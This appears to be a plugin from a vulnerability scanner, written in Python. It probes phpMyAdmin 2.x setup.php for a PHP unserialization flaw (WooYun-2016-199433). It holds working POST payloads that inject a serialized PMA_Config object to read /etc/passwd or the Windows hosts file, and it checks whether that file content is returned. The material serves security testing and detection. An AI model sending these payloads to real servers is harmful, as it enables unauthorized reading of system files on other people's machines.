#!/usr/bin/env python3
# -*- coding:utf-8 -*-

from lib.tool import check

wooyun_2016_199433_payloads = [
    {
        'path': 'scripts/setup.php',
        'data': 'action=test&configuration=O:10:"PMA_Config":1:{s:6:"source",s:11:"/etc/passwd";}'
    },
    {
        'path': 'scripts/setup.php',
        'data': 'action=test&configuration=O:10:"PMA_Config":1:{s:6:"source",s:11:"C:/Windows/System32/drivers/etc/hosts";}'
    },
    {
        'path': 'scripts/setup.php',
        'data': 'action=test&configuration=O:10:"PMA_Config":1:{s:6:"source",s:11:"C:\Windows\System32\drivers\etc\hosts";}'
    },
    {
        'path': 'setup.php',
        'data': 'action=test&configuration=O:10:"PMA_Config":1:{s:6:"source",s:11:"/etc/passwd";}'
    },
    {
        'path': 'setup.php',
        'data': 'action=test&configuration=O:10:"PMA_Config":1:{s:6:"source",s:11:"C:/Windows/System32/drivers/etc/hosts";}'
    },
    {
        'path': 'setup.php',
        'data': 'action=test&configuration=O:10:"PMA_Config":1:{s:6:"source",s:11:"C:\Windows\System32\drivers\etc\hosts";}'
    },
]

def wooyun_2016_199433_scan(clients):
    ''' 受影响的版本: 2.x  '''
    client = clients.get('reqClient')
    
    vul_info = {
        'app_name': 'phpMyadmin',
        'vul_type': 'unSerialization',
        'vul_id': 'WooYun-2016-199433',
    }

    for payload in wooyun_2016_199433_payloads:
        path = payload['path']
        data = payload['data']

        res = client.request(
            'post',
            path,
            data=data,
            allow_redirects=False,
            vul_info=vul_info
        )
        if res is None:
            continue

        if (check.check_res_fileread(res.text)):
            results = {
                'Target': res.request.url,
                'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                'Request': res
            }
            return results
    return None
